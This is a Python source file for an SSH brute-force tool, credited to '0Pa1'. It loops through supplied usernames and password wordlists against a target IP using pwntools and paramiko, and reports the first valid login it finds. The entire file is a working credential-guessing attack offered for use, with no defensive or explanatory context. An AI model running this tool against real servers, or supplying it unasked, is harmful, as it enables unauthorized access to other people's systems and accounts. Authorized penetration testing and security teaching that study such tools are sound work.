from pwn import *
import argparse
import paramiko
import ipaddress
import time


# checks if IP provided by user is valid
def valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return ip
    except ValueError:
        raise argparse.ArgumentTypeError(f'Invalid IP address {ip}')


def main():
    parser = argparse.ArgumentParser(description='SSH Brute Force tool by 0Pa1.')
    parser.add_argument('-t', '--target', required=True, type=valid_ip, help='Target IP')
    parser.add_argument('-u', '--username', help='Target username')
    parser.add_argument('-U', '--usernames', help='File containing list of usernames')
    parser.add_argument('-p', '--password', help='Single password')
    parser.add_argument('-w', '--wordlist', help='Full path to password file')

    args = parser.parse_args()

    if not (args.username or args.usernames):
        parser.error('Either a single username (-u) or a file with usernames (-U) must be provided.')
    if not (args.password or args.wordlist):
        parser.error('Either a single password (-p) or a file with passwords (-w) must be provided.')

    host = args.target

    try:
        usernames = [args.username] if args.username else open(args.usernames).read().splitlines()
        passwords = [args.password] if args.password else open(args.wordlist).read().splitlines()
    except FileNotFoundError as e:
        print(f'Error: {str(e)}')
        return

    attempts = 0

    try:
        for username in usernames:
            for password in passwords:
                password = password.strip()
                attempts += 1
                print(f'[{attempts}] Attempting Username: {username}, Password: {password}')

                try:
                    response = ssh(host=host, user=username, password=password, timeout=5)
                    if response.connected():
                        print(f'[+] Valid credentials found: Username: {username}, Password: {password}')
                        response.close()
                        return
                    response.close()
                except paramiko.ssh_exception.AuthenticationException:
                    print('[X] Invalid credentials! \n' + '-' * 10)
                except (EOFError, paramiko.ssh_exception.SSHException) as e:
                    print(f'[!] SSH Exception : {str(e)}')
                    time.sleep(10)
    except KeyboardInterrupt:
        print('\n[!] Execution interrupted by the user.')
    except Exception as e:
        print(f'[!] An unexpected error occurred: {str(e)}')


if __name__ == '__main__':
    main()
